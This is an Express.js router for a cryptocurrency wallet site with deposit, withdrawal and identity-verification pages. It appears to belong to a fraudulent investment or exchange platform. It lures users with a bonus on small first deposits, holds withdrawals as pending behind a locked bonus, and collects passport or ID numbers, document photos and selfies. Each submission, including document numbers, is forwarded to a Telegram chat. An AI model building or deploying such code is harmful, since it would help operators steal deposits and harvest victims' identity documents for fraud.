import { Router } from 'express';
import { randomUUID } from 'node:crypto';
import { mkdir, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import multer from 'multer';
import QRCode from 'qrcode';
import { layout, flash, usd } from '../ui.js';
import { currentUser, requireVerified } from './account.js';
import { NETWORKS, addressFor, config } from '../config.js';
import { touch, round, maybeUnlock } from '../store.js';
import { notify, esc } from '../telegram.js';

export const wallet = Router();

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });

wallet.get('/deposit', requireVerified, async (req, res) => {
  const user = currentUser(req);

  const cards = await Promise.all(
    NETWORKS.map(async (net) => {
      const addr = addressFor(net);
      if (!addr) return '';
      const qr = await QRCode.toDataURL(addr, {
        margin: 1,
        width: 190,
        color: { dark: '#0b0f14', light: '#ffffff' },
      });
      return `<div class="glass net">
      <h3>${net.label} <span class="muted">${net.sym}</span></h3>
      <img class="qr" src="${qr}" alt="">
      <code class="addr">${esc(addr)}</code>
      <p class="muted sm">Send only ${net.sym} on ${net.label}. Wrong-network transfers are lost.</p>
    </div>`;
    }),
  );

  res.send(
    layout(
      'Deposit',
      `
<section class="sec">
  ${flash(req.query.e)}
  <h2>Deposit crypto</h2>
  <p class="muted">Send to the address below, then log the transaction. Credit lands after confirmation.
  First deposits of ${usd(config.bonusMinDeposit)} or less trigger the ${usd(config.bonusAmount)} bonus.</p>
  <div class="grid2">${cards.join('') || '<p class="muted">No networks configured yet.</p>'}</div>

  <form class="glass form mt" method="post" action="/deposit">
    <h3>Log your transaction</h3>
    <label>Network</label>
    <select name="network">${NETWORKS.map((n) => `<option value="${n.id}">${n.label}</option>`).join('')}</select>
    <label>Amount sent (USD)</label><input name="amount" type="number" step="0.01" min="1" required>
    <label>Transaction hash</label><input name="txHash" required>
    <button class="btn full" type="submit">Submit deposit</button>
  </form>
</section>`,
      { user },
    ),
  );
});

wallet.post('/deposit', requireVerified, (req, res) => {
  const user = currentUser(req);
  const amount = round(Number(req.body.amount || 0));
  const dep = {
    id: randomUUID(),
    network: req.body.network || 'eth',
    amount,
    txHash: String(req.body.txHash || '').slice(0, 160),
    status: 'pending',
    createdAt: Date.now(),
  };
  user.deposits.push(dep);
  touch();
  notify(
    `💰 <b>DEPOSIT CLAIMED</b>\n<b>Email:</b> ${esc(user.email)}\n<b>Network:</b> ${esc(dep.network)}\n<b>Amount:</b> ${usd(amount)}\n<b>Tx:</b> <code>${esc(dep.txHash)}</code>\n<b>User:</b> <code>${user.id}</code>`,
  );
  res.redirect('/deposit?e=deposit');
});

wallet.get('/withdraw', requireVerified, (req, res) => {
  const user = currentUser(req);
  maybeUnlock(user);

  res.send(
    layout(
      'Withdraw',
      `
<section class="sec">
  ${flash(req.query.e)}
  <h2>Withdraw</h2>
  <p class="muted">Available: <b>${usd(user.balance)}</b>${user.bonus ? ` · locked bonus: ${usd(user.bonus)}` : ''}.
  Minimum ${usd(config.minWithdraw)}.</p>
  <form class="glass form" method="post" action="/withdraw">
    <label>Network</label>
    <select name="network">${NETWORKS.map((n) => `<option value="${n.id}">${n.label} · fee ${usd(n.fee)}</option>`).join('')}</select>
    <label>Destination address</label><input name="address" required>
    <label>Amount (USD)</label><input name="amount" type="number" step="0.01" min="${config.minWithdraw}" required>
    <button class="btn full" type="submit">Request withdrawal</button>
  </form>
</section>`,
      { user },
    ),
  );
});

wallet.post('/withdraw', requireVerified, (req, res) => {
  const user = currentUser(req);
  maybeUnlock(user);

  const amount = round(Number(req.body.amount || 0));
  if (amount < config.minWithdraw || amount > user.balance) return res.redirect('/withdraw?e=lowbal');

  user.balance = round(user.balance - amount);
  const w = {
    id: randomUUID(),
    network: req.body.network || 'eth',
    address: String(req.body.address || '').slice(0, 160),
    amount,
    status: 'pending',
    createdAt: Date.now(),
  };
  user.withdrawals.push(w);
  touch();
  notify(
    `📤 <b>WITHDRAWAL REQUEST</b>\n<b>Email:</b> ${esc(user.email)}\n<b>Network:</b> ${esc(w.network)}\n<b>Amount:</b> ${usd(amount)}\n<b>To:</b> <code>${esc(w.address)}</code>`,
  );
  res.redirect('/withdraw?e=withdraw');
});

wallet.get('/kyc', (req, res) => {
  const user = currentUser(req);
  if (!user) return res.redirect('/login');
  const k = user.kyc;

  res.send(
    layout(
      'Verification',
      `
<section class="sec">
  ${flash(req.query.e)}
  <h2>Identity verification</h2>
  <p class="muted">Level 2 is required for withdrawals above ${usd(2000)}.
  Current status: <span class="badge ${k?.status || ''}">${k?.status || 'unverified'}</span></p>

  <form class="glass form" method="post" action="/kyc" enctype="multipart/form-data">
    <div class="grid2">
      <div><label>Legal first name</label><input name="first" required></div>
      <div><label>Legal last name</label><input name="last" required></div>
      <div><label>Date of birth</label><input name="dob" type="date" required></div>
      <div><label>Country</label><input name="country" required></div>
    </div>
    <label>Residential address</label><input name="address" required>
    <label>Document type</label>
    <select name="docType"><option>Passport</option><option>National ID</option><option>Driver licence</option></select>
    <label>Document number</label><input name="docNumber" required>
    <label>Document photo</label><input name="document" type="file" accept="image/*" required>
    <label>Selfie holding the document</label><input name="selfie" type="file" accept="image/*" required>
    <button class="btn full" type="submit">Submit for review</button>
  </form>
</section>`,
      { user },
    ),
  );
});

wallet.post('/kyc', upload.fields([{ name: 'document' }, { name: 'selfie' }]), async (req, res) => {
  const user = currentUser(req);
  if (!user) return res.redirect('/login');

  await mkdir(join(config.dataDir, 'uploads'), { recursive: true });
  const save = async (file, tag) => {
    if (!file) return null;
    const name = `${user.id}-${tag}-${Date.now()}`;
    await writeFile(join(config.dataDir, 'uploads', name), file.buffer);
    return name;
  };

  user.kyc = {
    first: req.body.first,
    last: req.body.last,
    dob: req.body.dob,
    country: req.body.country,
    address: req.body.address,
    docType: req.body.docType,
    docNumber: req.body.docNumber,
    document: await save(req.files?.document?.[0], 'doc'),
    selfie: await save(req.files?.selfie?.[0], 'selfie'),
    status: 'pending',
    submittedAt: Date.now(),
  };
  touch();
  notify(
    `🪪 <b>KYC SUBMITTED</b>\n<b>Email:</b> ${esc(user.email)}\n<b>Name:</b> ${esc(req.body.first)} ${esc(req.body.last)}\n<b>Country:</b> ${esc(req.body.country)}\n<b>Doc:</b> ${esc(req.body.docType)} ${esc(req.body.docNumber)}`,
  );
  res.redirect('/kyc?e=kyc');
});
